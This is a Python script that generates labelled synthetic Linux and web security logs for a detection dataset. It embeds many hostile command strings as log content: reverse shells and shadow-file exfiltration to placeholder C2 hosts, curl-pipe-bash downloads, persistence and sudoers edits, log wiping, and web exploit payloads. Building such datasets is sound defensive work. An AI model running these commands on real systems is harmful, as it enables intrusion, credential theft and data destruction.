# -*- coding: utf-8 -*-
"""
====================================================================================
LARGE-SCALE COMBINATORIAL LINUX LOG DATASET GENERATOR (generate_dataset.py)
====================================================================================
This module uses a Combinatorial Dynamic Grammar Engine to generate millions of
completely unique, authentic system and network security logs with zero memory
overhead (<50MB RAM) using high-throughput streaming chunk buffers.

USAGE:
    python generate_dataset.py --samples 3000000 --output dataset_3m.jsonl
    python generate_dataset.py --samples 5000    --output dataset_5000.jsonl
====================================================================================
"""

import os
import sys
import time
import json
import random
import uuid
import string
import argparse

random.seed(int(time.time()))

# ==================================================================================
# 1. DİNAMİK ENTİTY VE PARAMETRE HAVUZLARI
# ==================================================================================

HOST_PREFIXES = ["srv-prod", "srv-stage", "srv-dev", "k8s-node", "k8s-master", "gw-edge", "sec-bastion", "storage-nfs", "db-cluster", "cache-redis"]
HOST_ROLES = ["web", "api", "backend", "db", "auth", "worker", "proxy", "collector", "broker", "search", "ingress"]

USERS_BENIGN = [
    "developer", "devops", "sysadmin", "sysops", "operator", "deployer", "ubuntu",
    "admin", "appadmin", "git", "jenkins", "postgres", "mysql", "redis", "nginx",
    "www-data", "grafana", "prometheus", "ansible", "backup_agent", "cloud-user",
    "john_doe", "alice_ops", "bob_dev", "sarah_qa", "mehmet_sec", "ayse_admin",
    "can_infra", "elena_k8s", "david_db", "fatma_audit", "alex_backend", "selin_dev"
]

USERS_MALICIOUS = [
    "hacker", "attacker", "intruder", "bad_actor", "root", "admin", "test", "guest",
    "oracle", "support", "user", "anonymous", "exploit_user", "pentester", "kali",
    "bot", "scanner", "crawler", "nobody", "ftp", "temp", "backdoor", "hidden", "miner",
    "system", "service", "daemon", "postfix", "bin", "mail", "shadow_user"
]

GTFOBINS_PROGRAMS = [
    "find", "vim", "nano", "tar", "zip", "awk", "gdb", "python", "python3", "perl",
    "ruby", "lua", "node", "php", "bash", "sh", "zsh", "dash", "csh", "env", "xargs",
    "sed", "less", "more", "man", "nmap", "pkexec", "capsh", "socat", "nc", "ncat",
    "tftp", "wget", "curl", "chmod", "chown", "dd", "mkfifo", "strace", "ltrace",
    "tcpdump", "base64", "openssl", "ssh", "rsync", "tee", "cut", "sort", "uniq",
    "flock", "stdbuf", "timeout", "run-parts", "taskset", "ionice", "nice", "chroot"
]

DEVOPS_CLI = [
    "docker", "podman", "kubectl", "helm", "crictl", "nerdctl", "terraform",
    "ansible", "ansible-playbook", "vagrant", "git", "pip", "npm", "yarn",
    "cargo", "go", "mvn", "gradle", "composer", "systemctl", "journalctl", "ufw", "iptables"
]

REST_RESOURCES = [
    "users", "products", "orders", "invoices", "payments", "auth", "items", "search",
    "telemetry", "healthcheck", "metrics", "reports", "settings", "accounts", "profiles",
    "notifications", "events", "logs", "assets", "devices", "sessions", "tokens", "traces"
]

FILE_EXTENSIONS = [".php", ".jsp", ".asp", ".aspx", ".cgi", ".pl", ".py", ".sh", ".json", ".html", ".js", ".css", ".png", ".jpg", ".webp", ".svg", ".woff2"]

USER_AGENTS_BENIGN = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Prometheus/2.45.0", "KubeProbe/1.28", "curl/7.88.1", "PostmanRuntime/7.32.3", "Go-http-client/1.1",
    "Amazon-Route53-HealthCheck-Service", "Datadog Agent/7.45.0"
]

USER_AGENTS_MALICIOUS = [
    "sqlmap/1.7.2#stable (http://sqlmap.org)",
    "Nikto/2.1.6",
    "masscan/1.3.2",
    "Nmap Scripting Engine (https://nmap.org/book/nse.html)",
    "Mozilla/5.0 (compatible; NessusSOAP)",
    "OWASP ZAP 2.12.0",
    "gobuster/3.5",
    "dirsearch/0.4.3",
    "Hydra v9.4 (https://github.com/vanhauser-thc/thc-hydra)",
    "WPScan v3.8.22",
    "Nuclei - Open-source project (https://github.com/projectdiscovery/nuclei)",
    "FFUF/v2.0.0-dev",
    "python-requests/2.28.1 (ExploitScript)",
    "Metasploit Framework (HTTP Client)"
]

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

# ==================================================================================
# 2. DİNAMİK YARDIMCI VE JENERATÖR FONKSİYONLARI
# ==================================================================================

def rand_hostname():
    return f"{random.choice(HOST_PREFIXES)}-{random.choice(HOST_ROLES)}{random.randint(1,99):02d}"

def rand_ipv4_lan():
    subnet_type = random.choice([1, 2, 3, 4])
    if subnet_type == 1:
        return f"192.168.{random.randint(0,254)}.{random.randint(1,254)}"
    elif subnet_type == 2:
        return f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
    elif subnet_type == 3:
        return f"172.{random.randint(16,31)}.{random.randint(0,254)}.{random.randint(1,254)}"
    else:
        return f"127.0.0.{random.randint(1,10)}"

def rand_ipv4_wan():
    # Gerçek dünya yönlendirilebilir genel IP blokları
    first_octet = random.choice([
        random.randint(23, 100),
        random.randint(103, 168),
        random.randint(176, 223)
    ])
    return f"{first_octet}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def rand_timestamp_syslog():
    mon = random.choice(MONTHS)
    day = random.randint(1, 28)
    h = random.randint(0, 23)
    m = random.randint(0, 59)
    s = random.randint(0, 59)
    # Tek haneli günlerde tek boşluk veya çift boşluk (RFC3164)
    day_str = f"{day:2d}"
    return f"{mon} {day_str} {h:02d}:{m:02d}:{s:02d}"

def rand_timestamp_iso():
    return f"2026-{random.randint(1,12):02d}-{random.randint(1,28):02d}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}.{random.randint(100000,999999):06d}+03:00"

def rand_timestamp_apache():
    mon = random.choice(MONTHS)
    return f"[{random.randint(1,28):02d}/{mon}/2026:{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d} +0300]"

def rand_hex_token(length=8):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def rand_c2_port():
    return random.choice([4444, 1337, 8888, 9001, 8080, 8443, 31337, 6667, 53, 443, 80, 22, random.randint(1024, 65535)])

# ==================================================================================
# 3. KOMBİNATÖRİK ZARARLI (MALICIOUS) LOG ÜRETECİ
# ==================================================================================

def generate_combinatorial_malicious():
    ts = rand_timestamp_syslog()
    h = rand_hostname()
    pid = random.randint(100, 65535)
    wan_ip = rand_ipv4_wan()
    lan_ip = rand_ipv4_lan()
    c2_ip = rand_ipv4_wan()
    u = random.choice(USERS_MALICIOUS)
    c2_port = rand_c2_port()
    prog = random.choice(GTFOBINS_PROGRAMS)
    hex_id = rand_hex_token(12)

    category_id = random.randint(1, 14)

    if category_id == 1:
        # 1. SSH / PAM / Postfix / Auth Brute Force & Password Spraying (T1110)
        port = random.randint(1024, 65535)
        service = random.choice(["sshd", "vsftpd", "postfix/smtpd", "dovecot", "PAM-legacy", "login"])
        if service == "sshd":
            variant = random.choice([
                f"Failed password for invalid user {u} from {wan_ip} port {port} ssh2",
                f"Failed password for {u} from {wan_ip} port {port} ssh2",
                f"Invalid user {u} from {wan_ip} port {port}",
                f"Connection closed by authenticating user {u} {wan_ip} port {port} [preauth]",
                f"Connection reset by {wan_ip} port {port} [preauth]",
                f"error: PAM: Authentication failure for {u} from {wan_ip}",
                f"Maximum authentication attempts exceeded for {u} from {wan_ip} port {port} ssh2",
                f"Did not receive identification string from {wan_ip} port {port} (Banner Grab / Masscan)",
                f"User {u} not allowed because not listed in AllowUsers (from {wan_ip})"
            ])
            log = f"{ts} {h} sshd[{pid}]: {variant}"
        elif service == "PAM-legacy":
            log = f"{ts} {h} PAM-legacy[{pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={wan_ip}"
        elif service == "vsftpd":
            log = f"{ts} {h} vsftpd[{pid}]: [{u}] FAIL LOGIN: Client \"{wan_ip}\""
        elif service == "postfix/smtpd":
            log = f"{ts} {h} postfix/smtpd[{pid}]: warning: unknown[{wan_ip}]: SASL LOGIN authentication failed: {hex_id[:8]}"
        else:
            log = f"{ts} {h} dovecot[{pid}]: pop3-login: Aborted login (auth failed, {random.randint(2,5)} attempts): user=<{u}>, rip={wan_ip}, lip=10.0.0.5"
        return log, "EXTERNAL", "AUTH_ANOMALY", "T1110", "HIGH"

    elif category_id == 2:
        # 2. Web Exploits (SQLi, NoSQLi, XSS, XXE, SSRF, LFI, RFI) (T1190)
        web_server = random.choice(["nginx", "apache2", "caddy", "traefik"])
        status = random.choice([200, 400, 403, 404, 500, 502])
        ua = random.choice(USER_AGENTS_MALICIOUS)
        res = random.choice(REST_RESOURCES)
        ext = random.choice([".php", ".jsp", ".action", ""])
        ts_apache = rand_timestamp_apache()

        sub_cat = random.choice(["sqli", "xss", "lfi", "cmd_inj", "ssrf", "xxe"])
        if sub_cat == "sqli":
            sqli_payload = random.choice([
                f"id=-1%20UNION%20SELECT%201,username,password%20FROM%20users--",
                f"id={random.randint(1,999)}%27%20AND%201=CONVERT(int,(SELECT%20@@version))--",
                f"sort=id;WAITFOR%20DELAY%20%270:0:{random.randint(3,10)}%27--",
                f"q=test%27%20OR%20pg_sleep({random.randint(3,10)})--",
                f"user=%27%20OR%20%271%27=%271%27%20--%20&pass={random.randint(100,999)}",
                f"id=1%27%20UNION%20SELECT%201,load_file(%27/etc/passwd%27),3--",
                f"id=1;DROP%20TABLE%20{res}--",
                f"filter={{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}"
            ])
            req = f"GET /{res}{ext}?{sqli_payload} HTTP/1.1"
        elif sub_cat == "xss":
            xss_payload = random.choice([
                "<script>alert(document.cookie)</script>",
                "<img%20src=x%20onerror=alert(1)>",
                f"\"><script%20src=http://{c2_ip}/xss.js></script>",
                "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
                f"<iframe/src=javascript:alert(document.domain)>"
            ])
            req = f"GET /{res}{ext}?q={xss_payload} HTTP/1.1"
        elif sub_cat == "lfi":
            lfi_payload = random.choice([
                "../../../../../../etc/passwd",
                "....//....//....//etc/shadow",
                "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "php://filter/read=convert.base64-encode/resource=config.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUXFsnY21kJ10pOyA/Pg==",
                "expect://id"
            ])
            req = f"GET /{res}{ext}?file={lfi_payload} HTTP/1.1"
        elif sub_cat == "cmd_inj":
            cmd_payload = random.choice([
                "127.0.0.1%7Ccat%20/etc/passwd",
                "google.com;id",
                "127.0.0.1%26%26whoami",
                "`id`",
                "$(whoami)",
                f"127.0.0.1;curl%20http://{c2_ip}/sh|sh"
            ])
            req = f"GET /{res}{ext}?host={cmd_payload} HTTP/1.1"
        elif sub_cat == "ssrf":
            ssrf_payload = random.choice([
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "gopher://127.0.0.1:6379/_flushall",
                "dict://127.0.0.1:11211/stats"
            ])
            req = f"GET /api/v1/fetch?url={ssrf_payload} HTTP/1.1"
        else: # XXE
            req = f"POST /{res}/xml HTTP/1.1\" 200 120 \"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>"

        log = f"{ts} {h} {web_server}[{pid}]: {wan_ip} - - {ts_apache} \"{req}\" {status} {random.randint(100,5000)} \"-\" \"{ua}\""
        return log, "EXTERNAL", "APPLICATION_EXPLOIT", "T1190", "CRITICAL"

    elif category_id == 3:
        # 3. Known CVEs (Log4j, Spring4Shell, ThinkPHP, Struts2, PHPUnit) (T1190)
        cve_payload = random.choice([
            f"User-Agent: ${{jndi:ldap://{c2_ip}:1389/{hex_id}}}",
            f"X-Api-Version: ${{jndi:rmi://{c2_ip}:1099/Exploit}}",
            f"Cookie: session=${{jndi:dns://{c2_ip}/leak}}",
            f"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 200 45 \"<?php system('id');?>\"",
            f"POST /cgi-bin/test-cgi HTTP/1.1\" 500 0 \"User-Agent: () {{ :; }}; echo; /bin/bash -c 'id'\"",
            f"GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfifo HTTP/1.1",
            f"GET /actuator/gateway/routes/hack HTTP/1.1",
            f"POST /actuator/env HTTP/1.1\" 200 450 \"{{\\\"name\\\":\\\"eureka.client.serviceUrl.defaultZone\\\",\\\"value\\\":\\\"http://{c2_ip}/\\\"}}\"",
            f"POST /struts2-showcase/showcase.action HTTP/1.1\" 200 3400 \"%{{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}}\"",
            f"GET /?s=/Index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1"
        ])
        log = f"{ts} {h} nginx[{pid}]: {wan_ip} - - {rand_timestamp_apache()} \"{cve_payload}\""
        return log, "EXTERNAL", "APPLICATION_EXPLOIT", "T1190", "CRITICAL"

    elif category_id == 4:
        # 4. Reverse Shells & Interactive Shells (T1071, T1059)
        rev_variant = random.choice([
            f"bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1",
            f"/bin/bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1",
            f"nc -e /bin/sh {c2_ip} {c2_port}",
            f"nc -e /bin/bash {c2_ip} {c2_port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2_ip} {c2_port} >/tmp/f",
            f"ncat --ssl {c2_ip} {c2_port} -e /bin/bash",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{c2_ip}\",{c2_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{c2_ip}\",{c2_port}));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
            f"perl -e 'use Socket;$i=\"{c2_ip}\";$p={c2_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            f"php -r '$sock=fsockopen(\"{c2_ip}\",{c2_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{c2_ip}\",\"{c2_port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:{c2_ip}:{c2_port}",
            f"node -e 'require(\"child_process\").exec(\"nc -e /bin/sh {c2_ip} {c2_port}\")'",
            f"lua -e 'os.execute(\"/bin/sh -i\")'"
        ])
        context = random.choice(["CRON", "bash", "sudo"])
        if context == "CRON":
            log = f"{ts} {h} CRON[{pid}]: (www-data) CMD ({rev_variant})"
        elif context == "sudo":
            log = f"{ts} {h} sudo: www-data : TTY=pts/{random.randint(0,3)} ; USER=root ; COMMAND={rev_variant}"
        else:
            log = f"{ts} {h} bash[{pid}]: Executed: {rev_variant}"
        return log, "INTERNAL", "NETWORK_C2", "T1071", "CRITICAL"

    elif category_id == 5:
        # 5. GTFOBins & SUID Privilege Escalation (T1068, T1548)
        gtfo_variant = random.choice([
            f"/usr/bin/find . -exec /bin/sh -i \\;",
            f"/usr/bin/find . -execdir /bin/sh \\; -quit",
            f"/usr/bin/tar -cf /dev/null /tmp --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            f"/usr/bin/awk 'BEGIN {{system(\"/bin/sh\")}}'",
            f"/usr/bin/awk -f /tmp/evil.awk /etc/passwd",
            f"/usr/bin/vim -c ':!/bin/sh'",
            f"/usr/bin/gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
            f"/usr/bin/git -c core.pager='exec /bin/sh' help",
            f"/usr/bin/env /bin/sh",
            f"/usr/bin/sed -n '1e exec /bin/sh' /etc/hosts",
            f"/usr/bin/nano -s /bin/sh",
            f"/usr/bin/man -P /bin/sh ls",
            f"/usr/bin/zip /tmp/test.zip /etc/passwd -T -TT '/bin/sh -c id#'",
            f"/usr/bin/flock -u / /bin/sh",
            f"/usr/bin/pkexec /bin/sh",
            f"/usr/bin/capsh --gid=0 --uid=0 --",
            f"/usr/bin/chmod +s /bin/bash",
            f"/usr/bin/chmod 4755 /bin/dash",
            f"cp /bin/bash /tmp/.b && chmod u+s /tmp/.b",
            f"python3 -c 'import os; os.setresuid(0,0,0); os.execl(\"/bin/bash\", \"bash\")'",
            f"./exploit_dirtypipe /etc/passwd 1 \":0:0:root:/root:/bin/bash\"",
            f"echo \"{u} ALL=(ALL:ALL) NOPASSWD: ALL\" >> /etc/sudoers",
            f"echo \"root:p@ssw0rd123!\" | chpasswd",
            f"usermod -aG root {u}",
            f"usermod -aG sudo {u}"
        ])
        log = f"{ts} {h} sudo: {u} : TTY=pts/{random.randint(0,3)} ; USER=root ; COMMAND={gtfo_variant}"
        return log, "INTERNAL", "SYSTEM_INTEGRITY", "T1068", "CRITICAL"

    elif category_id == 6:
        # 6. Obfuscation, Command Splitting & Evasion (T1027, T1070)
        obf_variant = random.choice([
            f"/b'i'n/b'a's'h -c \"cat /etc/shadow > /dev/tcp/{c2_ip}/{c2_port}\"",
            f"bash -c \"$'\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68' -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1\"",
            f"/???/b*sh -c \"cat /etc/sha* > /dev/tcp/{c2_ip}/{c2_port}\"",
            f"u=${{PATH:0:1}}; ${{u}}bin${{u}}bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1",
            f"IFS=,;cmd=cat,/etc/shadow;$cmd",
            f"base64 -d <<< \"Y2F0IC9ldGMvc2hhZG93\" | sh",
            f"echo \"c2hhcGhpbmcgaGFja2VkYmFzaA==\" | base64 -d | sh",
            f"python3 -c \"import bytes;exec(bytes.fromhex('696d706f7274206f73').decode())\"",
            f"export HISTFILE=/dev/null && unset HISTFILE",
            f"history -c && rm -f ~/.bash_history",
            f"history -c && history -w && rm -f ~/.bash_history",
            f"rm -rf /var/log/auth.log && ln -s /dev/null /var/log/auth.log",
            f"killall -9 rsyslogd",
            f"systemctl stop auditd",
            f"ufw disable",
            f"iptables -F",
            f"setenforce 0",
            f"touch -r /bin/ls /tmp/.backdoor",
            f"dd if=/dev/urandom of=/dev/sda bs=1M count=10"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {obf_variant}"
        return log, "INTERNAL", "OBFUSCATION_EVASION", "T1027", "HIGH"

    elif category_id == 7:
        # 7. Cryptominers & Rogue Daemons (T1496)
        miner_variant = random.choice([
            f"./xmrig --donate-level 1 -o stratum+tcp://{c2_ip}:3333 -u 48edfHu7V9Z8... -p x --threads 8",
            f"nohup ./kinsing -c http://{c2_ip}/k.sh >/dev/null 2>&1 &",
            f"curl -fsSL http://{c2_ip}/miner.sh | bash",
            f"/dev/shm/.xmr -o pool.minexmr.com:4444 -u monero_wallet -k",
            f"wget http://{c2_ip}/sys_update -O /tmp/.systemd-daemon && chmod +x /tmp/.systemd-daemon && /tmp/.systemd-daemon"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {miner_variant}"
        return log, "INTERNAL", "RESOURCE_HIJACK", "T1496", "CRITICAL"

    elif category_id == 8:
        # 8. Rootkits & Kernel Memory Manipulation (T1014, T1055)
        rootkit_variant = random.choice([
            f"[DIAMORPHINE] Module loaded: hiding process {random.randint(1000,9999)} and module itself.",
            f"insmod /dev/shm/diamorphine.ko",
            f"export LD_PRELOAD=/tmp/libhook_sshd.so",
            f"echo \"/tmp/libhook.so\" > /etc/ld.so.preload",
            f"gdb -p $(pgrep sshd) --batch -ex 'call (void*)system(\"nc -e /bin/sh {c2_ip} 4444\")'",
            f"cat /proc/{random.randint(1,500)}/mem > /tmp/mem_dump"
        ])
        if "Module loaded" in rootkit_variant:
            log = f"{ts} {h} kernel: {rootkit_variant}"
        else:
            log = f"{ts} {h} bash[{pid}]: Executed: {rootkit_variant}"
        return log, "INTERNAL", "PROCESS_INJECTION", "T1014", "CRITICAL"

    elif category_id == 9:
        # 9. Active Directory & Kerberos Attacks in Linux (T1003)
        ad_variant = random.choice([
            f"python3 /tmp/GetUserSPNs.py corp.local/admin:Password123 -request -outputfile /tmp/hashes.kerberoast",
            f"python3 /tmp/GetNPUsers.py corp.local/ -no-pass -usersfile /tmp/users.txt -format hashcat",
            f"python3 /tmp/secretsdump.py corp.local/Administrator:hash@{lan_ip} -just-dc-ntlm",
            f"./mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
            f"./responder -I eth0 -dwv",
            f"python3 /tmp/wmiexec.py corp.local/admin:pass@{lan_ip} 'whoami /priv'"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {ad_variant}"
        return log, "INTERNAL", "CREDENTIAL_DUMPING", "T1003", "CRITICAL"

    elif category_id == 10:
        # 10. Container Escape & Cloud API Abuse (T1611, T1530)
        escape_variant = random.choice([
            f"dockerd[{pid}]: msg=\"Container exec started\" cmd=\"docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host\"",
            f"dockerd[{pid}]: msg=\"Container run privileged mode enabled container={hex_id}\"",
            f"kubelet[{pid}]: I0818 {ts}.123 {pid} exec.go:70] Executing command in pod \"system-shell\": [\"/bin/sh\", \"-c\", \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\"]",
            f"bash[{pid}]: Executed: aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE",
            f"bash[{pid}]: Executed: aws s3 sync s3://company-private-data /tmp/exfil",
            f"bash[{pid}]: Executed: gcloud auth activate-service-account --key-file=/tmp/key.json",
            f"bash[{pid}]: Executed: kubectl exec -it admin-pod -- /bin/sh -c \"cat /etc/shadow\""
        ])
        log = f"{ts} {h} {escape_variant}"
        return log, "INTERNAL", "CONTAINER_ESCAPE", "T1611", "CRITICAL"

    elif category_id == 11:
        # 11. Data Exfiltration (DNS, ICMP, HTTP) (T1048)
        exfil_variant = random.choice([
            f"cat /etc/shadow | nc {c2_ip} 9999",
            f"tar -czf - /var/www/html | openssl enc -e -aes-256-cbc -out /tmp/data.enc",
            f"curl -F \"file=@/etc/shadow\" http://{c2_ip}/upload",
            f"for i in $(cat /etc/shadow | xxd -p); do dig +short $i.attacker.com; done",
            f"dig +short $(cat /etc/passwd | base64 | tr -d '\\n').attacker.com",
            f"base64 /etc/passwd | curl -d @- http://{c2_ip}/log"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {exfil_variant}"
        return log, "INTERNAL", "DATA_EXFILTRATION", "T1048", "CRITICAL"

    elif category_id == 12:
        # 12. Network Scanning & Recon (Nmap, Masscan, Netfilter Block) (T1046)
        scan_variant = random.choice([
            f"bash[{pid}]: Executed: nmap -sS -p 1-65535 10.0.0.0/24",
            f"bash[{pid}]: Executed: masscan -p1-65535 10.0.0.0/8 --rate=10000",
            f"bash[{pid}]: Executed: ./linpeas.sh -a > /tmp/linpeas.txt",
            f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:fe:12:00 SRC={wan_ip} DST=10.0.0.5 LEN=40 PROTO=TCP SPT={random.randint(40000,60000)} DPT={random.choice([22, 80, 443, 3306, 5432, 6379, 8080, 27017])} WINDOW=0 RES=0x00 SYN URGP=0",
            f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:fe:12:00 SRC={wan_ip} DST=10.0.0.5 LEN=40 PROTO=TCP SPT={random.randint(40000,60000)} DPT=445 FLAGS=FIN PSH URG",
            f"kernel: [IPTABLES DROP] IN=eth0 SRC={wan_ip} DST=10.0.0.5 PROTO=TCP DPT=3389 FLAGS=ACK",
            f"kernel: arp: hardware address changed for 10.0.0.1 from 00:50:56:c0:00:01 to aa:bb:cc:dd:ee:ff (ARP Poisoning by {wan_ip})"
        ])
        log = f"{ts} {h} {scan_variant}"
        return log, "EXTERNAL", "NETWORK_SCAN_PROBE", "T1046", "HIGH"

    elif category_id == 13:
        # 13. Tunnels & Pivoting (Chisel, Ligolo, Ngrok) (T1090)
        tunnel_variant = random.choice([
            f"./chisel client {c2_ip}:8080 R:socks",
            f"./ngrok tcp 22 --authtoken={hex_id}",
            f"./ligolo-agent -connect {c2_ip}:11601 -ignore-cert",
            f"ssh -N -R 2222:localhost:22 attacker@{c2_ip}"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {tunnel_variant}"
        return log, "INTERNAL", "NETWORK_C2", "T1090", "CRITICAL"

    else:
        # 14. Persistence via Systemd / Crontab / PAM (T1053, T1543)
        persist_variant = random.choice([
            f"echo \"* * * * * root /tmp/.x >/dev/null 2>&1\" >> /etc/crontab",
            f"echo \"* * * * * root curl -s http://{c2_ip}/cron | bash\" >> /etc/crontab",
            f"systemctl enable /tmp/backdoor.service",
            f"echo \"auth optional pam_exec.so expose_authtok /tmp/steal.sh\" >> /etc/pam.d/common-auth",
            f"echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@c2\" >> /root/.ssh/authorized_keys"
        ])
        log = f"{ts} {h} bash[{pid}]: Executed: {persist_variant}"
        return log, "INTERNAL", "SYSTEM_INTEGRITY", "T1053", "CRITICAL"

# ==================================================================================
# 4. KOMBİNATÖRİK GÜVENLİ (SAFE) LOG ÜRETECİ
# ==================================================================================

def generate_combinatorial_safe():
    ts = rand_timestamp_syslog()
    h = rand_hostname()
    pid = random.randint(100, 65535)
    wan_ip = rand_ipv4_wan()
    lan_ip = rand_ipv4_lan()
    u = random.choice(USERS_BENIGN)
    port = random.randint(1024, 65535)
    ua = random.choice(USER_AGENTS_BENIGN)
    res = random.choice(REST_RESOURCES)
    hex_id = rand_hex_token(8)
    ts_apache = rand_timestamp_apache()

    category_id = random.randint(1, 10)

    if category_id == 1:
        # 1. Systemd, Kernel & Hardware Daemons
        sys_variant = random.choice([
            f"systemd[{pid}]: Started Session {random.randint(1,5000)} of user {u}.",
            f"systemd[{pid}]: Starting Daily Cleanup of Temporary Directories...",
            f"systemd-logind[{pid}]: New session {random.randint(100,900)} of user {u}.",
            f"systemd[{pid}]: Reached target Network is Online.",
            f"systemd[{pid}]: Created slice User Slice of user {u}.",
            f"systemd[{pid}]: Starting Rotate log files...",
            f"systemd[{pid}]: Started Daily apt download activities.",
            f"systemd[{pid}]: Reached target Graphical Interface.",
            f"systemd[{pid}]: Started Periodic Command Scheduler.",
            f"systemd-resolved[{pid}]: Clock synchronized to server {lan_ip}.",
            f"systemd-timesyncd[{pid}]: Synchronized to time server {lan_ip}:123.",
            f"kernel: [{random.uniform(10, 1000):.6f}] usb 1-1: New USB device found, idVendor=0781, idProduct=5581",
            f"kernel: [{random.uniform(1000, 5000):.6f}] EXT4-fs (sda1): re-mounted. Opts: errors=remount-ro",
            f"kernel: [{random.uniform(2000, 6000):.6f}] eth0: Link is Up 1000 Mbps Full Duplex",
            f"NetworkManager[{pid}]: <info> dhcp4 (eth0): state changed bound to {lan_ip}",
            f"dbus-daemon[{pid}]: [system] Successfully activated service 'org.freedesktop.hostname1'",
            f"polkitd[{pid}]: Registered Authentication Agent for unix-process:{random.randint(1000,9999)}:{random.randint(10000,99999)}"
        ])
        log = f"{ts} {h} {sys_variant}"
        return log, "INTERNAL", "SYSTEM_DAEMON"

    elif category_id == 2:
        # 2. SSHD, Login, PAM & Authentic Sudo Maintenance
        auth_variant = random.choice([
            f"sshd[{pid}]: Accepted password for {u} from {lan_ip} port {port} ssh2",
            f"sshd[{pid}]: Accepted publickey for {u} from {lan_ip} port {port} ssh2: RSA SHA256:{hex_id}",
            f"sshd[{pid}]: Received disconnect from {lan_ip} port {port}:11: disconnected by user",
            f"systemd-logind[{pid}]: Session {random.randint(100,900)} logged out. Waiting for processes to exit.",
            f"PAM-legacy[{pid}]: pam_unix(sudo:session): session opened for user root(uid=0) by {u}(uid=1000)",
            f"PAM-legacy[{pid}]: pam_unix(sshd:session): session opened for user {u}(uid=1001) by (uid=0)",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/etc/ssl ; USER=root ; COMMAND=/usr/bin/openssl x509 -in cert.pem -text -noout",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/zcat auth.log.2.gz | grep \"Failed\"",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/error.log",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/root ; USER=root ; COMMAND=/usr/bin/uptime",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=2d",
            f"sudo: {u} : TTY=pts/{random.randint(0,3)} ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/sbin/nginx -t",
